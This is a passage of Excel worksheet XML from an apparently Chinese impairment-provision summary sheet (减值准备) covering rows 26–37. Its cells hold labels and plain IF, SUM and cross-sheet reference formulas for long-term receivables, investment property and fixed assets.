      <c r="AT26" s="389" t="n"/>
      <c r="AU26" s="389" t="n"/>
      <c r="AV26" s="389" t="n"/>
      <c r="AW26" s="389" t="n"/>
      <c r="AX26" s="389" t="n"/>
      <c r="AY26" s="389" t="n"/>
      <c r="AZ26" s="389" t="n"/>
      <c r="BA26" s="389" t="n"/>
      <c r="BB26" s="389" t="n"/>
      <c r="BC26" s="389" t="n"/>
      <c r="BD26" s="389" t="n"/>
      <c r="BE26" s="389" t="n"/>
      <c r="BF26" s="389" t="n"/>
    </row>
    <row r="27" ht="15" customHeight="1" s="415">
      <c r="A27" s="55" t="n"/>
      <c r="B27" s="185" t="inlineStr">
        <is>
          <t>可售其他</t>
        </is>
      </c>
      <c r="C27" s="180" t="inlineStr">
        <is>
          <t xml:space="preserve">         可供出售其他资产</t>
        </is>
      </c>
      <c r="D27" s="631" t="n"/>
      <c r="E27" s="631" t="n"/>
      <c r="F27" s="627">
        <f>IF((E27-D27)=0,"",(E27-D27))</f>
        <v/>
      </c>
      <c r="G27" s="627">
        <f>IF(OR(D27=0,D27="",F27=""),"",F27/D27*100)</f>
        <v/>
      </c>
      <c r="H27" s="628" t="n"/>
      <c r="I27" s="389" t="n"/>
      <c r="J27" s="389" t="n"/>
      <c r="K27" s="389" t="n"/>
      <c r="L27" s="389" t="n"/>
      <c r="M27" s="389" t="n"/>
      <c r="N27" s="389" t="n"/>
      <c r="O27" s="389" t="n"/>
      <c r="P27" s="389" t="n"/>
      <c r="Q27" s="389" t="n"/>
      <c r="R27" s="389" t="n"/>
      <c r="S27" s="389" t="n"/>
      <c r="T27" s="389" t="n"/>
      <c r="U27" s="389" t="n"/>
      <c r="V27" s="389" t="n"/>
      <c r="W27" s="389" t="n"/>
      <c r="X27" s="389" t="n"/>
      <c r="Y27" s="389" t="n"/>
      <c r="Z27" s="389" t="n"/>
      <c r="AA27" s="389" t="n"/>
      <c r="AB27" s="389" t="n"/>
      <c r="AC27" s="389" t="n"/>
      <c r="AD27" s="389" t="n"/>
      <c r="AE27" s="389" t="n"/>
      <c r="AF27" s="389" t="n"/>
      <c r="AG27" s="389" t="n"/>
      <c r="AH27" s="389" t="n"/>
      <c r="AI27" s="389" t="n"/>
      <c r="AJ27" s="389" t="n"/>
      <c r="AK27" s="389" t="n"/>
      <c r="AL27" s="389" t="n"/>
      <c r="AM27" s="389" t="n"/>
      <c r="AN27" s="389" t="n"/>
      <c r="AO27" s="389" t="n"/>
      <c r="AP27" s="389" t="n"/>
      <c r="AQ27" s="389" t="n"/>
      <c r="AR27" s="389" t="n"/>
      <c r="AS27" s="389" t="n"/>
      <c r="AT27" s="389" t="n"/>
      <c r="AU27" s="389" t="n"/>
      <c r="AV27" s="389" t="n"/>
      <c r="AW27" s="389" t="n"/>
      <c r="AX27" s="389" t="n"/>
      <c r="AY27" s="389" t="n"/>
      <c r="AZ27" s="389" t="n"/>
      <c r="BA27" s="389" t="n"/>
      <c r="BB27" s="389" t="n"/>
      <c r="BC27" s="389" t="n"/>
      <c r="BD27" s="389" t="n"/>
      <c r="BE27" s="389" t="n"/>
      <c r="BF27" s="389" t="n"/>
    </row>
    <row r="28" ht="15" customHeight="1" s="415">
      <c r="A28" s="55" t="n"/>
      <c r="B28" s="185" t="inlineStr">
        <is>
          <t>持有到期</t>
        </is>
      </c>
      <c r="C28" s="180" t="inlineStr">
        <is>
          <t>四、持有至到期投资减值准备</t>
        </is>
      </c>
      <c r="D28" s="631" t="n"/>
      <c r="E28" s="631" t="n"/>
      <c r="F28" s="627">
        <f>IF((E28-D28)=0,"",(E28-D28))</f>
        <v/>
      </c>
      <c r="G28" s="627">
        <f>IF(OR(D28=0,D28="",F28=""),"",F28/D28*100)</f>
        <v/>
      </c>
      <c r="H28" s="628" t="n"/>
      <c r="I28" s="389" t="n"/>
      <c r="J28" s="389" t="n"/>
      <c r="K28" s="389" t="n"/>
      <c r="L28" s="389" t="n"/>
      <c r="M28" s="389" t="n"/>
      <c r="N28" s="389" t="n"/>
      <c r="O28" s="389" t="n"/>
      <c r="P28" s="389" t="n"/>
      <c r="Q28" s="389" t="n"/>
      <c r="R28" s="389" t="n"/>
      <c r="S28" s="389" t="n"/>
      <c r="T28" s="389" t="n"/>
      <c r="U28" s="389" t="n"/>
      <c r="V28" s="389" t="n"/>
      <c r="W28" s="389" t="n"/>
      <c r="X28" s="389" t="n"/>
      <c r="Y28" s="389" t="n"/>
      <c r="Z28" s="389" t="n"/>
      <c r="AA28" s="389" t="n"/>
      <c r="AB28" s="389" t="n"/>
      <c r="AC28" s="389" t="n"/>
      <c r="AD28" s="389" t="n"/>
      <c r="AE28" s="389" t="n"/>
      <c r="AF28" s="389" t="n"/>
      <c r="AG28" s="389" t="n"/>
      <c r="AH28" s="389" t="n"/>
      <c r="AI28" s="389" t="n"/>
      <c r="AJ28" s="389" t="n"/>
      <c r="AK28" s="389" t="n"/>
      <c r="AL28" s="389" t="n"/>
      <c r="AM28" s="389" t="n"/>
      <c r="AN28" s="389" t="n"/>
      <c r="AO28" s="389" t="n"/>
      <c r="AP28" s="389" t="n"/>
      <c r="AQ28" s="389" t="n"/>
      <c r="AR28" s="389" t="n"/>
      <c r="AS28" s="389" t="n"/>
      <c r="AT28" s="389" t="n"/>
      <c r="AU28" s="389" t="n"/>
      <c r="AV28" s="389" t="n"/>
      <c r="AW28" s="389" t="n"/>
      <c r="AX28" s="389" t="n"/>
      <c r="AY28" s="389" t="n"/>
      <c r="AZ28" s="389" t="n"/>
      <c r="BA28" s="389" t="n"/>
      <c r="BB28" s="389" t="n"/>
      <c r="BC28" s="389" t="n"/>
      <c r="BD28" s="389" t="n"/>
      <c r="BE28" s="389" t="n"/>
      <c r="BF28" s="389" t="n"/>
    </row>
    <row r="29" ht="15" customHeight="1" s="415">
      <c r="A29" s="55" t="inlineStr">
        <is>
          <t>4-1</t>
        </is>
      </c>
      <c r="B29" s="185" t="n"/>
      <c r="C29" s="180" t="n"/>
      <c r="D29" s="631" t="n"/>
      <c r="E29" s="631" t="n"/>
      <c r="F29" s="627" t="n"/>
      <c r="G29" s="627" t="n"/>
      <c r="H29" s="628" t="n"/>
      <c r="I29" s="389" t="n"/>
      <c r="J29" s="389" t="n"/>
      <c r="K29" s="389" t="n"/>
      <c r="L29" s="389" t="n"/>
      <c r="M29" s="389" t="n"/>
      <c r="N29" s="389" t="n"/>
      <c r="O29" s="389" t="n"/>
      <c r="P29" s="389" t="n"/>
      <c r="Q29" s="389" t="n"/>
      <c r="R29" s="389" t="n"/>
      <c r="S29" s="389" t="n"/>
      <c r="T29" s="389" t="n"/>
      <c r="U29" s="389" t="n"/>
      <c r="V29" s="389" t="n"/>
      <c r="W29" s="389" t="n"/>
      <c r="X29" s="389" t="n"/>
      <c r="Y29" s="389" t="n"/>
      <c r="Z29" s="389" t="n"/>
      <c r="AA29" s="389" t="n"/>
      <c r="AB29" s="389" t="n"/>
      <c r="AC29" s="389" t="n"/>
      <c r="AD29" s="389" t="n"/>
      <c r="AE29" s="389" t="n"/>
      <c r="AF29" s="389" t="n"/>
      <c r="AG29" s="389" t="n"/>
      <c r="AH29" s="389" t="n"/>
      <c r="AI29" s="389" t="n"/>
      <c r="AJ29" s="389" t="n"/>
      <c r="AK29" s="389" t="n"/>
      <c r="AL29" s="389" t="n"/>
      <c r="AM29" s="389" t="n"/>
      <c r="AN29" s="389" t="n"/>
      <c r="AO29" s="389" t="n"/>
      <c r="AP29" s="389" t="n"/>
      <c r="AQ29" s="389" t="n"/>
      <c r="AR29" s="389" t="n"/>
      <c r="AS29" s="389" t="n"/>
      <c r="AT29" s="389" t="n"/>
      <c r="AU29" s="389" t="n"/>
      <c r="AV29" s="389" t="n"/>
      <c r="AW29" s="389" t="n"/>
      <c r="AX29" s="389" t="n"/>
      <c r="AY29" s="389" t="n"/>
      <c r="AZ29" s="389" t="n"/>
      <c r="BA29" s="389" t="n"/>
      <c r="BB29" s="389" t="n"/>
      <c r="BC29" s="389" t="n"/>
      <c r="BD29" s="389" t="n"/>
      <c r="BE29" s="389" t="n"/>
      <c r="BF29" s="389" t="n"/>
    </row>
    <row r="30" ht="15" customHeight="1" s="415">
      <c r="A30" s="55" t="inlineStr">
        <is>
          <t>4-2</t>
        </is>
      </c>
      <c r="B30" s="185" t="n"/>
      <c r="C30" s="180" t="n"/>
      <c r="D30" s="631" t="n"/>
      <c r="E30" s="631" t="n"/>
      <c r="F30" s="627" t="n"/>
      <c r="G30" s="627" t="n"/>
      <c r="H30" s="628" t="n"/>
      <c r="I30" s="389" t="n"/>
      <c r="J30" s="389" t="n"/>
      <c r="K30" s="389" t="n"/>
      <c r="L30" s="389" t="n"/>
      <c r="M30" s="389" t="n"/>
      <c r="N30" s="389" t="n"/>
      <c r="O30" s="389" t="n"/>
      <c r="P30" s="389" t="n"/>
      <c r="Q30" s="389" t="n"/>
      <c r="R30" s="389" t="n"/>
      <c r="S30" s="389" t="n"/>
      <c r="T30" s="389" t="n"/>
      <c r="U30" s="389" t="n"/>
      <c r="V30" s="389" t="n"/>
      <c r="W30" s="389" t="n"/>
      <c r="X30" s="389" t="n"/>
      <c r="Y30" s="389" t="n"/>
      <c r="Z30" s="389" t="n"/>
      <c r="AA30" s="389" t="n"/>
      <c r="AB30" s="389" t="n"/>
      <c r="AC30" s="389" t="n"/>
      <c r="AD30" s="389" t="n"/>
      <c r="AE30" s="389" t="n"/>
      <c r="AF30" s="389" t="n"/>
      <c r="AG30" s="389" t="n"/>
      <c r="AH30" s="389" t="n"/>
      <c r="AI30" s="389" t="n"/>
      <c r="AJ30" s="389" t="n"/>
      <c r="AK30" s="389" t="n"/>
      <c r="AL30" s="389" t="n"/>
      <c r="AM30" s="389" t="n"/>
      <c r="AN30" s="389" t="n"/>
      <c r="AO30" s="389" t="n"/>
      <c r="AP30" s="389" t="n"/>
      <c r="AQ30" s="389" t="n"/>
      <c r="AR30" s="389" t="n"/>
      <c r="AS30" s="389" t="n"/>
      <c r="AT30" s="389" t="n"/>
      <c r="AU30" s="389" t="n"/>
      <c r="AV30" s="389" t="n"/>
      <c r="AW30" s="389" t="n"/>
      <c r="AX30" s="389" t="n"/>
      <c r="AY30" s="389" t="n"/>
      <c r="AZ30" s="389" t="n"/>
      <c r="BA30" s="389" t="n"/>
      <c r="BB30" s="389" t="n"/>
      <c r="BC30" s="389" t="n"/>
      <c r="BD30" s="389" t="n"/>
      <c r="BE30" s="389" t="n"/>
      <c r="BF30" s="389" t="n"/>
    </row>
    <row r="31" ht="15" customHeight="1" s="415">
      <c r="A31" s="55" t="inlineStr">
        <is>
          <t>4-3</t>
        </is>
      </c>
      <c r="B31" s="185" t="inlineStr">
        <is>
          <t>长期应收</t>
        </is>
      </c>
      <c r="C31" s="180" t="inlineStr">
        <is>
          <t>五、长期应收款减值准备</t>
        </is>
      </c>
      <c r="D31" s="629">
        <f>'4-3长期应收'!F27</f>
        <v/>
      </c>
      <c r="E31" s="629">
        <f>'4-3长期应收'!G27</f>
        <v/>
      </c>
      <c r="F31" s="627">
        <f>IF((E31-D31)=0,"",(E31-D31))</f>
        <v/>
      </c>
      <c r="G31" s="627">
        <f>IF(OR(D31=0,D31="",F31=""),"",F31/D31*100)</f>
        <v/>
      </c>
      <c r="H31" s="628" t="n"/>
      <c r="I31" s="389" t="n"/>
      <c r="J31" s="389" t="n"/>
      <c r="K31" s="389" t="n"/>
      <c r="L31" s="389" t="n"/>
      <c r="M31" s="389" t="n"/>
      <c r="N31" s="389" t="n"/>
      <c r="O31" s="389" t="n"/>
      <c r="P31" s="389" t="n"/>
      <c r="Q31" s="389" t="n"/>
      <c r="R31" s="389" t="n"/>
      <c r="S31" s="389" t="n"/>
      <c r="T31" s="389" t="n"/>
      <c r="U31" s="389" t="n"/>
      <c r="V31" s="389" t="n"/>
      <c r="W31" s="389" t="n"/>
      <c r="X31" s="389" t="n"/>
      <c r="Y31" s="389" t="n"/>
      <c r="Z31" s="389" t="n"/>
      <c r="AA31" s="389" t="n"/>
      <c r="AB31" s="389" t="n"/>
      <c r="AC31" s="389" t="n"/>
      <c r="AD31" s="389" t="n"/>
      <c r="AE31" s="389" t="n"/>
      <c r="AF31" s="389" t="n"/>
      <c r="AG31" s="389" t="n"/>
      <c r="AH31" s="389" t="n"/>
      <c r="AI31" s="389" t="n"/>
      <c r="AJ31" s="389" t="n"/>
      <c r="AK31" s="389" t="n"/>
      <c r="AL31" s="389" t="n"/>
      <c r="AM31" s="389" t="n"/>
      <c r="AN31" s="389" t="n"/>
      <c r="AO31" s="389" t="n"/>
      <c r="AP31" s="389" t="n"/>
      <c r="AQ31" s="389" t="n"/>
      <c r="AR31" s="389" t="n"/>
      <c r="AS31" s="389" t="n"/>
      <c r="AT31" s="389" t="n"/>
      <c r="AU31" s="389" t="n"/>
      <c r="AV31" s="389" t="n"/>
      <c r="AW31" s="389" t="n"/>
      <c r="AX31" s="389" t="n"/>
      <c r="AY31" s="389" t="n"/>
      <c r="AZ31" s="389" t="n"/>
      <c r="BA31" s="389" t="n"/>
      <c r="BB31" s="389" t="n"/>
      <c r="BC31" s="389" t="n"/>
      <c r="BD31" s="389" t="n"/>
      <c r="BE31" s="389" t="n"/>
      <c r="BF31" s="389" t="n"/>
    </row>
    <row r="32" ht="15" customHeight="1" s="415">
      <c r="A32" s="55" t="inlineStr">
        <is>
          <t>4-4</t>
        </is>
      </c>
      <c r="B32" s="185" t="inlineStr">
        <is>
          <t>长期股权</t>
        </is>
      </c>
      <c r="C32" s="180" t="inlineStr">
        <is>
          <t>六、长期股权投资减值准备</t>
        </is>
      </c>
      <c r="D32" s="629">
        <f>'4-4股权投资'!H28</f>
        <v/>
      </c>
      <c r="E32" s="629">
        <f>'4-4股权投资'!I28</f>
        <v/>
      </c>
      <c r="F32" s="627">
        <f>IF((E32-D32)=0,"",(E32-D32))</f>
        <v/>
      </c>
      <c r="G32" s="627">
        <f>IF(OR(D32=0,D32="",F32=""),"",F32/D32*100)</f>
        <v/>
      </c>
      <c r="H32" s="628" t="n"/>
      <c r="I32" s="389" t="n"/>
      <c r="J32" s="389" t="n"/>
      <c r="K32" s="389" t="n"/>
      <c r="L32" s="389" t="n"/>
      <c r="M32" s="389" t="n"/>
      <c r="N32" s="389" t="n"/>
      <c r="O32" s="389" t="n"/>
      <c r="P32" s="389" t="n"/>
      <c r="Q32" s="389" t="n"/>
      <c r="R32" s="389" t="n"/>
      <c r="S32" s="389" t="n"/>
      <c r="T32" s="389" t="n"/>
      <c r="U32" s="389" t="n"/>
      <c r="V32" s="389" t="n"/>
      <c r="W32" s="389" t="n"/>
      <c r="X32" s="389" t="n"/>
      <c r="Y32" s="389" t="n"/>
      <c r="Z32" s="389" t="n"/>
      <c r="AA32" s="389" t="n"/>
      <c r="AB32" s="389" t="n"/>
      <c r="AC32" s="389" t="n"/>
      <c r="AD32" s="389" t="n"/>
      <c r="AE32" s="389" t="n"/>
      <c r="AF32" s="389" t="n"/>
      <c r="AG32" s="389" t="n"/>
      <c r="AH32" s="389" t="n"/>
      <c r="AI32" s="389" t="n"/>
      <c r="AJ32" s="389" t="n"/>
      <c r="AK32" s="389" t="n"/>
      <c r="AL32" s="389" t="n"/>
      <c r="AM32" s="389" t="n"/>
      <c r="AN32" s="389" t="n"/>
      <c r="AO32" s="389" t="n"/>
      <c r="AP32" s="389" t="n"/>
      <c r="AQ32" s="389" t="n"/>
      <c r="AR32" s="389" t="n"/>
      <c r="AS32" s="389" t="n"/>
      <c r="AT32" s="389" t="n"/>
      <c r="AU32" s="389" t="n"/>
      <c r="AV32" s="389" t="n"/>
      <c r="AW32" s="389" t="n"/>
      <c r="AX32" s="389" t="n"/>
      <c r="AY32" s="389" t="n"/>
      <c r="AZ32" s="389" t="n"/>
      <c r="BA32" s="389" t="n"/>
      <c r="BB32" s="389" t="n"/>
      <c r="BC32" s="389" t="n"/>
      <c r="BD32" s="389" t="n"/>
      <c r="BE32" s="389" t="n"/>
      <c r="BF32" s="389" t="n"/>
    </row>
    <row r="33" ht="15" customHeight="1" s="415">
      <c r="A33" s="55" t="n"/>
      <c r="B33" s="185" t="inlineStr">
        <is>
          <t>投房汇总</t>
        </is>
      </c>
      <c r="C33" s="180" t="inlineStr">
        <is>
          <t>七、投资性房地产减值准备合计</t>
        </is>
      </c>
      <c r="D33" s="627">
        <f>SUM(D34:D35)</f>
        <v/>
      </c>
      <c r="E33" s="627">
        <f>SUM(E34:E35)</f>
        <v/>
      </c>
      <c r="F33" s="627">
        <f>IF((E33-D33)=0,"",(E33-D33))</f>
        <v/>
      </c>
      <c r="G33" s="627">
        <f>IF(OR(D33=0,D33="",F33=""),"",F33/D33*100)</f>
        <v/>
      </c>
      <c r="H33" s="628" t="n"/>
      <c r="I33" s="389" t="n"/>
      <c r="J33" s="389" t="n"/>
      <c r="K33" s="389" t="n"/>
      <c r="L33" s="389" t="n"/>
      <c r="M33" s="389" t="n"/>
      <c r="N33" s="389" t="n"/>
      <c r="O33" s="389" t="n"/>
      <c r="P33" s="389" t="n"/>
      <c r="Q33" s="389" t="n"/>
      <c r="R33" s="389" t="n"/>
      <c r="S33" s="389" t="n"/>
      <c r="T33" s="389" t="n"/>
      <c r="U33" s="389" t="n"/>
      <c r="V33" s="389" t="n"/>
      <c r="W33" s="389" t="n"/>
      <c r="X33" s="389" t="n"/>
      <c r="Y33" s="389" t="n"/>
      <c r="Z33" s="389" t="n"/>
      <c r="AA33" s="389" t="n"/>
      <c r="AB33" s="389" t="n"/>
      <c r="AC33" s="389" t="n"/>
      <c r="AD33" s="389" t="n"/>
      <c r="AE33" s="389" t="n"/>
      <c r="AF33" s="389" t="n"/>
      <c r="AG33" s="389" t="n"/>
      <c r="AH33" s="389" t="n"/>
      <c r="AI33" s="389" t="n"/>
      <c r="AJ33" s="389" t="n"/>
      <c r="AK33" s="389" t="n"/>
      <c r="AL33" s="389" t="n"/>
      <c r="AM33" s="389" t="n"/>
      <c r="AN33" s="389" t="n"/>
      <c r="AO33" s="389" t="n"/>
      <c r="AP33" s="389" t="n"/>
      <c r="AQ33" s="389" t="n"/>
      <c r="AR33" s="389" t="n"/>
      <c r="AS33" s="389" t="n"/>
      <c r="AT33" s="389" t="n"/>
      <c r="AU33" s="389" t="n"/>
      <c r="AV33" s="389" t="n"/>
      <c r="AW33" s="389" t="n"/>
      <c r="AX33" s="389" t="n"/>
      <c r="AY33" s="389" t="n"/>
      <c r="AZ33" s="389" t="n"/>
      <c r="BA33" s="389" t="n"/>
      <c r="BB33" s="389" t="n"/>
      <c r="BC33" s="389" t="n"/>
      <c r="BD33" s="389" t="n"/>
      <c r="BE33" s="389" t="n"/>
      <c r="BF33" s="389" t="n"/>
    </row>
    <row r="34" ht="15" customHeight="1" s="415">
      <c r="A34" s="55" t="n"/>
      <c r="B34" s="185" t="inlineStr">
        <is>
          <t>投房房屋</t>
        </is>
      </c>
      <c r="C34" s="180" t="inlineStr">
        <is>
          <t xml:space="preserve">    其中：房屋</t>
        </is>
      </c>
      <c r="D34" s="629">
        <f>'4-7-1投资性房地产'!L28</f>
        <v/>
      </c>
      <c r="E34" s="629">
        <f>'4-7-1投资性房地产'!O28</f>
        <v/>
      </c>
      <c r="F34" s="627">
        <f>IF((E34-D34)=0,"",(E34-D34))</f>
        <v/>
      </c>
      <c r="G34" s="627">
        <f>IF(OR(D34=0,D34="",F34=""),"",F34/D34*100)</f>
        <v/>
      </c>
      <c r="H34" s="628" t="n"/>
      <c r="I34" s="389" t="n"/>
      <c r="J34" s="389" t="n"/>
      <c r="K34" s="389" t="n"/>
      <c r="L34" s="389" t="n"/>
      <c r="M34" s="389" t="n"/>
      <c r="N34" s="389" t="n"/>
      <c r="O34" s="389" t="n"/>
      <c r="P34" s="389" t="n"/>
      <c r="Q34" s="389" t="n"/>
      <c r="R34" s="389" t="n"/>
      <c r="S34" s="389" t="n"/>
      <c r="T34" s="389" t="n"/>
      <c r="U34" s="389" t="n"/>
      <c r="V34" s="389" t="n"/>
      <c r="W34" s="389" t="n"/>
      <c r="X34" s="389" t="n"/>
      <c r="Y34" s="389" t="n"/>
      <c r="Z34" s="389" t="n"/>
      <c r="AA34" s="389" t="n"/>
      <c r="AB34" s="389" t="n"/>
      <c r="AC34" s="389" t="n"/>
      <c r="AD34" s="389" t="n"/>
      <c r="AE34" s="389" t="n"/>
      <c r="AF34" s="389" t="n"/>
      <c r="AG34" s="389" t="n"/>
      <c r="AH34" s="389" t="n"/>
      <c r="AI34" s="389" t="n"/>
      <c r="AJ34" s="389" t="n"/>
      <c r="AK34" s="389" t="n"/>
      <c r="AL34" s="389" t="n"/>
      <c r="AM34" s="389" t="n"/>
      <c r="AN34" s="389" t="n"/>
      <c r="AO34" s="389" t="n"/>
      <c r="AP34" s="389" t="n"/>
      <c r="AQ34" s="389" t="n"/>
      <c r="AR34" s="389" t="n"/>
      <c r="AS34" s="389" t="n"/>
      <c r="AT34" s="389" t="n"/>
      <c r="AU34" s="389" t="n"/>
      <c r="AV34" s="389" t="n"/>
      <c r="AW34" s="389" t="n"/>
      <c r="AX34" s="389" t="n"/>
      <c r="AY34" s="389" t="n"/>
      <c r="AZ34" s="389" t="n"/>
      <c r="BA34" s="389" t="n"/>
      <c r="BB34" s="389" t="n"/>
      <c r="BC34" s="389" t="n"/>
      <c r="BD34" s="389" t="n"/>
      <c r="BE34" s="389" t="n"/>
      <c r="BF34" s="389" t="n"/>
    </row>
    <row r="35" ht="15" customHeight="1" s="415">
      <c r="A35" s="55" t="n"/>
      <c r="B35" s="185" t="inlineStr">
        <is>
          <t>投房土地</t>
        </is>
      </c>
      <c r="C35" s="180" t="inlineStr">
        <is>
          <t xml:space="preserve">         土地使用权</t>
        </is>
      </c>
      <c r="D35" s="629">
        <f>'4-7-3投资性地产'!N28</f>
        <v/>
      </c>
      <c r="E35" s="629">
        <f>'4-7-3投资性地产'!O28</f>
        <v/>
      </c>
      <c r="F35" s="627">
        <f>IF((E35-D35)=0,"",(E35-D35))</f>
        <v/>
      </c>
      <c r="G35" s="627">
        <f>IF(OR(D35=0,D35="",F35=""),"",F35/D35*100)</f>
        <v/>
      </c>
      <c r="H35" s="628" t="n"/>
      <c r="I35" s="389" t="n"/>
      <c r="J35" s="389" t="n"/>
      <c r="K35" s="389" t="n"/>
      <c r="L35" s="389" t="n"/>
      <c r="M35" s="389" t="n"/>
      <c r="N35" s="389" t="n"/>
      <c r="O35" s="389" t="n"/>
      <c r="P35" s="389" t="n"/>
      <c r="Q35" s="389" t="n"/>
      <c r="R35" s="389" t="n"/>
      <c r="S35" s="389" t="n"/>
      <c r="T35" s="389" t="n"/>
      <c r="U35" s="389" t="n"/>
      <c r="V35" s="389" t="n"/>
      <c r="W35" s="389" t="n"/>
      <c r="X35" s="389" t="n"/>
      <c r="Y35" s="389" t="n"/>
      <c r="Z35" s="389" t="n"/>
      <c r="AA35" s="389" t="n"/>
      <c r="AB35" s="389" t="n"/>
      <c r="AC35" s="389" t="n"/>
      <c r="AD35" s="389" t="n"/>
      <c r="AE35" s="389" t="n"/>
      <c r="AF35" s="389" t="n"/>
      <c r="AG35" s="389" t="n"/>
      <c r="AH35" s="389" t="n"/>
      <c r="AI35" s="389" t="n"/>
      <c r="AJ35" s="389" t="n"/>
      <c r="AK35" s="389" t="n"/>
      <c r="AL35" s="389" t="n"/>
      <c r="AM35" s="389" t="n"/>
      <c r="AN35" s="389" t="n"/>
      <c r="AO35" s="389" t="n"/>
      <c r="AP35" s="389" t="n"/>
      <c r="AQ35" s="389" t="n"/>
      <c r="AR35" s="389" t="n"/>
      <c r="AS35" s="389" t="n"/>
      <c r="AT35" s="389" t="n"/>
      <c r="AU35" s="389" t="n"/>
      <c r="AV35" s="389" t="n"/>
      <c r="AW35" s="389" t="n"/>
      <c r="AX35" s="389" t="n"/>
      <c r="AY35" s="389" t="n"/>
      <c r="AZ35" s="389" t="n"/>
      <c r="BA35" s="389" t="n"/>
      <c r="BB35" s="389" t="n"/>
      <c r="BC35" s="389" t="n"/>
      <c r="BD35" s="389" t="n"/>
      <c r="BE35" s="389" t="n"/>
      <c r="BF35" s="389" t="n"/>
    </row>
    <row r="36" ht="15" customHeight="1" s="415">
      <c r="A36" s="521" t="inlineStr">
        <is>
          <t>4-8</t>
        </is>
      </c>
      <c r="B36" s="185" t="inlineStr">
        <is>
          <t>固资汇总</t>
        </is>
      </c>
      <c r="C36" s="180" t="inlineStr">
        <is>
          <t>八、固定资产减值准备合计</t>
        </is>
      </c>
      <c r="D36" s="627">
        <f>SUM(D37:D42)</f>
        <v/>
      </c>
      <c r="E36" s="627">
        <f>SUM(E37:E42)</f>
        <v/>
      </c>
      <c r="F36" s="627">
        <f>IF((E36-D36)=0,"",(E36-D36))</f>
        <v/>
      </c>
      <c r="G36" s="627">
        <f>IF(OR(D36=0,D36="",F36=""),"",F36/D36*100)</f>
        <v/>
      </c>
      <c r="H36" s="628" t="n"/>
      <c r="I36" s="389" t="n"/>
      <c r="J36" s="389" t="n"/>
      <c r="K36" s="389" t="n"/>
      <c r="L36" s="389" t="n"/>
      <c r="M36" s="389" t="n"/>
      <c r="N36" s="389" t="n"/>
      <c r="O36" s="389" t="n"/>
      <c r="P36" s="389" t="n"/>
      <c r="Q36" s="389" t="n"/>
      <c r="R36" s="389" t="n"/>
      <c r="S36" s="389" t="n"/>
      <c r="T36" s="389" t="n"/>
      <c r="U36" s="389" t="n"/>
      <c r="V36" s="389" t="n"/>
      <c r="W36" s="389" t="n"/>
      <c r="X36" s="389" t="n"/>
      <c r="Y36" s="389" t="n"/>
      <c r="Z36" s="389" t="n"/>
      <c r="AA36" s="389" t="n"/>
      <c r="AB36" s="389" t="n"/>
      <c r="AC36" s="389" t="n"/>
      <c r="AD36" s="389" t="n"/>
      <c r="AE36" s="389" t="n"/>
      <c r="AF36" s="389" t="n"/>
      <c r="AG36" s="389" t="n"/>
      <c r="AH36" s="389" t="n"/>
      <c r="AI36" s="389" t="n"/>
      <c r="AJ36" s="389" t="n"/>
      <c r="AK36" s="389" t="n"/>
      <c r="AL36" s="389" t="n"/>
      <c r="AM36" s="389" t="n"/>
      <c r="AN36" s="389" t="n"/>
      <c r="AO36" s="389" t="n"/>
      <c r="AP36" s="389" t="n"/>
      <c r="AQ36" s="389" t="n"/>
      <c r="AR36" s="389" t="n"/>
      <c r="AS36" s="389" t="n"/>
      <c r="AT36" s="389" t="n"/>
      <c r="AU36" s="389" t="n"/>
      <c r="AV36" s="389" t="n"/>
      <c r="AW36" s="389" t="n"/>
      <c r="AX36" s="389" t="n"/>
      <c r="AY36" s="389" t="n"/>
      <c r="AZ36" s="389" t="n"/>
      <c r="BA36" s="389" t="n"/>
      <c r="BB36" s="389" t="n"/>
      <c r="BC36" s="389" t="n"/>
      <c r="BD36" s="389" t="n"/>
      <c r="BE36" s="389" t="n"/>
      <c r="BF36" s="389" t="n"/>
    </row>
    <row r="37" ht="15" customHeight="1" s="415">
      <c r="A37" s="521" t="inlineStr">
        <is>
          <t>4-8-1</t>
        </is>
      </c>
      <c r="B37" s="185" t="inlineStr">
        <is>
          <t>固资房屋</t>
        </is>
      </c>
      <c r="C37" s="180" t="inlineStr">
        <is>
          <t xml:space="preserve">    其中：房屋、建筑物</t>
        </is>
      </c>
      <c r="D37" s="629">
        <f>'4-8-1房屋建筑物'!K33</f>
        <v/>
      </c>
      <c r="E37" s="629">
        <f>'4-8-1房屋建筑物'!N33</f>
        <v/>
      </c>
      <c r="F37" s="627">
        <f>IF((E37-D37)=0,"",(E37-D37))</f>
        <v/>
      </c>
      <c r="G37" s="627">
        <f>IF(OR(D37=0,D37="",F37=""),"",F37/D37*100)</f>
        <v/>
      </c>
      <c r="H37" s="628" t="n"/>
      <c r="I37" s="389" t="n"/>
      <c r="J37" s="389" t="n"/>
      <c r="K37" s="389" t="n"/>
      <c r="L37" s="389" t="n"/>
      <c r="M37" s="389" t="n"/>
      <c r="N37" s="389" t="n"/>
      <c r="O37" s="389" t="n"/>
      <c r="P37" s="389" t="n"/>
      <c r="Q37" s="389" t="n"/>
      <c r="R37" s="389" t="n"/>
      <c r="S37" s="389" t="n"/>
      <c r="T37" s="389" t="n"/>
      <c r="U37" s="389" t="n"/>
      <c r="V37" s="389" t="n"/>
      <c r="W37" s="389" t="n"/>
      <c r="X37" s="389" t="n"/>
      <c r="Y37" s="389" t="n"/>
      <c r="Z37" s="389" t="n"/>
      <c r="AA37" s="389" t="n"/>
      <c r="AB37" s="389" t="n"/>
      <c r="AC37" s="389" t="n"/>
      <c r="AD37" s="389" t="n"/>
      <c r="AE37" s="389" t="n"/>
      <c r="AF37" s="389" t="n"/>
      <c r="AG37" s="389" t="n"/>
      <c r="AH37" s="389" t="n"/>
      <c r="AI37" s="389" t="n"/>
      <c r="AJ37" s="389" t="n"/>
      <c r="AK37" s="389" t="n"/>
      <c r="AL37" s="389" t="n"/>
      <c r="AM37" s="389" t="n"/>
      <c r="AN37" s="389" t="n"/>
      <c r="AO37" s="389" t="n"/>
      <c r="AP37" s="389" t="n"/>
      <c r="AQ37" s="389" t="n"/>
      <c r="AR37" s="389" t="n"/>
      <c r="AS37" s="389" t="n"/>
      <c r="AT37" s="389" t="n"/>
      <c r="AU37" s="389" t="n"/>
      <c r="AV37" s="389" t="n"/>
      <c r="AW37" s="389" t="n"/>
      <c r="AX37" s="389" t="n"/>
      <c r="AY37" s="389" t="n"/>
      <c r="AZ37" s="389" t="n"/>
      <c r="BA37" s="389" t="n"/>
      <c r="BB37" s="389" t="n"/>
      <c r="BC37" s="389" t="n"/>
      <c r="BD37" s="389" t="n"/>
      <c r="BE37" s="389" t="n"/>
      <c r="BF37" s="389" t="n"/>
    </row>
    <row r="38" ht="15" customHeight="1" s="415">
